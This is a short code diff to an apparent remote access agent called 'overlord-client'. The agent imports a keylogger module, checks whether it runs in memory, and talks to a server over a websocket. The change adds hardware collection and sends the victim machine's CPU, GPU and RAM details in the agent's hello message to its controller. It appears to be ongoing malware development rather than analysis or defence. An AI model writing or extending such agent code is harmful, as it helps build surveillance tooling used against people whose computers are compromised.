@@ -25,6 +25,7 @@ import (
 	"overlord-client/cmd/agent/keylogger"
 	"overlord-client/cmd/agent/plugins"
 	rt "overlord-client/cmd/agent/runtime"
+	"overlord-client/cmd/agent/sysinfo"
 	"overlord-client/cmd/agent/wire"
 
 	"nhooyr.io/websocket"
@@ -503,6 +504,11 @@ func runSession(ctx context.Context, cancel context.CancelFunc, conn *websocket.
 		Signature:   signatureB64,
 		InMemory:    isRunningInMemory(),
 	}
+
+	hw := sysinfo.Collect()
+	hello.CPU = hw.CPU
+	hello.GPU = hw.GPU
+	hello.RAM = hw.RAM
 
 	if err := wire.WriteMsg(ctx, env.Conn, hello); err != nil {
 		return fmt.Errorf("send hello: %w", err)
